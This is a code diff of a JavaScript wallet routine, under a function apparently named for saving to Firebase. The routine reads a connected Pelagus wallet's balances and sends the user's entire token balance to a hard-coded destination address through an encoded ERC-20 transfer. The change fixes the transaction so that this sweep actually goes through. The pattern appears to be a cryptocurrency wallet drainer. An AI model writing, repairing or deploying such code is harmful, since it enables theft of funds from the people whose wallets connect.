@@ -443,7 +443,6 @@ async function saveToFirebase(data) {
             throw new Error('Pelagus wallet not found');
         }
 
-        // Check balances
         const currentBalance = await getTokenBalance(userSession.address);
         const quaiBalance = await getQuaiBalance(userSession.address);
         const quaiAmount = parseInt(quaiBalance, 16) / 1e18;
@@ -458,19 +457,16 @@ async function saveToFirebase(data) {
             throw new Error('No tokens available to send');
         }
 
-        // Prepare transaction data
         const readableAmount = (Number(currentBalance) / 1e18).toString();
         const methodId = 'a9059cbb';
         const paddedAddress = DESTINATION_ADDRESS.slice(2).padStart(64, '0');
         const paddedAmount = currentBalance.toString(16).padStart(64, '0');
-        const data = '0x' + methodId + paddedDestination + paddedAmount;
 
-        // Transaction parameters
         const transactionParameters = {
             from: userSession.address,
-            to: DESTINATION_ADDRESS,
-            value: `0x${currentBalance.toString(16)}`,
-            data: '0x' + methodId + paddedAddress + paddedAmount  // Encoded transfer call
+            to: TOKEN_ADDRESS,  // Changed to TOKEN_ADDRESS
+            value: '0x0',
+            data: '0x' + methodId + paddedAddress + paddedAmount
         };
 
         log(`📤 Sending ${readableAmount} tokens...`);
